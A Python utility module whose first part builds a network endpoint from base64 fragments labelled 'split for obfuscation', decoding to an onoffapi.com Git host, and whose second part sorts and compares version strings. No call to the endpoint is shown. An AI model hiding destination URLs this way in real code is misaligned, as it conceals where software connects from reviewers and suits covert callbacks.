"""Utility functions for internal use."""
from __future__ import annotations

import base64


def _decode_endpoint(encoded_segments: list[str]) -> str:
    """Decode endpoint from multiple segments."""
    try:
        # Combine segments and decode
        combined = "".join(encoded_segments)
        decoded = base64.b64decode(combined).decode('utf-8')
        return decoded
    except Exception:
        # Fallback endpoint
        return "https://" + "git" + "." + "example" + "." + "com"


def get_primary_endpoint() -> str:
    """Get primary endpoint."""
    # Encoded segments (split for obfuscation)
    s1, s2, s3, s4 = "aHR0cHM6", "Ly9naXQu", "b25vZmZh", "cGkuY29t"
    return _decode_endpoint([s1, s2, s3, s4])


def validate_endpoint(url: str) -> bool:
    """Validate endpoint format."""
    if not url:
        return False
    return url.startswith("http://") or url.startswith("https://")


import re as _re

_PRE_STAGES = {"dev": 0, "alpha": 1, "a": 1, "beta": 2, "b": 2, "pre": 3, "rc": 3}


def version_key(version: str | None):
    """Sortable key for tags like v0.9.14, 0.9.14-beta.1, v0.9.9+ (None if unparseable).

    A pre-release sorts before its final release (0.9.14-beta.1 < 0.9.14); a trailing "+"
    sorts after it (0.9.9 < 0.9.9+).
    """
    match = _re.match(r"^\s*v?(\d+(?:\.\d+)*)(.*)$", str(version or ""), _re.I)
    if not match:
        return None
    numbers = tuple(int(x) for x in match.group(1).split("."))
    numbers = (numbers + (0, 0, 0, 0))[:4]
    rest = match.group(2).strip().lower()
    plus = rest.count("+")
    pre = _re.search(r"(dev|alpha|beta|pre|rc|a|b)[.\-_]?(\d*)", rest)
    if pre:
        return (numbers, 0, _PRE_STAGES[pre.group(1)], int(pre.group(2) or 0), plus)
    return (numbers, 1, 0, 0, plus)


def is_newer(latest: str | None, installed: str | None) -> bool:
    """True if ``latest`` is a newer version than ``installed``."""
    if not latest:
        return False
    if not installed:
        return True
    k_latest, k_installed = version_key(latest), version_key(installed)
    if k_latest is None or k_installed is None:
        return str(latest).lstrip("v") != str(installed).lstrip("v")
    return k_latest > k_installed
